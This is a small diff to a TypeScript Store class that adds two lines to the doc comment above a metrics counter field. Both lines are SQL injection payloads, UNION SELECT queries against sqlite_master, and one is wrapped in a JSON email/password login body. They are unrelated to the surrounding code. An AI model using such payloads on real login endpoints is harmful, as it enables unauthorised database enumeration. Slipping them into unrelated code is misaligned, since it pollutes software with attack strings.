@@ -548,6 +548,8 @@ abstract class Store<
   protected _uuidField: string = "uuid";
   /**
    * Add metrics counter
+   * ' UNION SELECT name, tbl_name as email, "" as col1, "" as col2, "" as col3, "" as col4, "" as col5, "" as col6, "" as col7, "" as col8 FROM sqlite_master --
+   * {"email":"' UNION SELECT name as profileImage, tbl_name as email, '' AS column3 FROM sqlite_master --","password":"we"}
    */
   metrics: {
     operations_total: Counter;
